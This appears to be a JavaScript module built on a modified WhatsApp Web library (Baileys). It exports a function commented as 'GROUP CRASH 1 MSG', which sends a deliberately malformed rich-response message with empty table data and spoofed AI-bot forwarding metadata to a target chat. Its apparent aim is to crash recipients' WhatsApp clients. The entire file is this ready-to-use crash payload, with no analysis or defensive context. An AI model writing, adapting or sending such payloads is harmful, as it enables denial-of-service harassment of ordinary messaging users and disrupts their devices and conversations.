const {
    default: makeWASocket,
    useMultiFileAuthState,
    Browsers,
    delay,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    generateWAMessageFromContent
} = require('@poucode/baileys');
const pino = require('pino');
const crypto = require('crypto');

/* GROUP CRASH 1 MSG 
*/
async function clickgc(demmy, target) {
  await demmy.relayMessage(target, {
    messageContextInfo: {
     deviceListMetadata: {},
       deviceListMetadataVersion: 2,
         botMetadata: {
           pluginMetadata: {},
            richResponseSourcesMetadata: {
              sources: []
            }
          }
        },
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 1,
              submessages: [{
                messageType: 2,
                messageText: ""
              }, {
                messageType: 4,
                tableMetadata: {
                  title: "",
                  rows: [{
                    items: [],
                    isHeading: true
                  }, {
                    items: []
                  }, {
                    items: []
                  }]
                }
              }],
              unifiedResponse: {
                data: JSON.stringify({
                  response_id: crypto.randomUUID(),
                  sections: []
                })
              },
              contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedAiBotMessageInfo: {
                  botJid: "867051314767696@bot"
                },
                forwardOrigin: 4
              }
            }
          }
        }
      }, {
        messageId: "Sex" + Date.now()
      });
    }

module.exports = {
    clickgc
}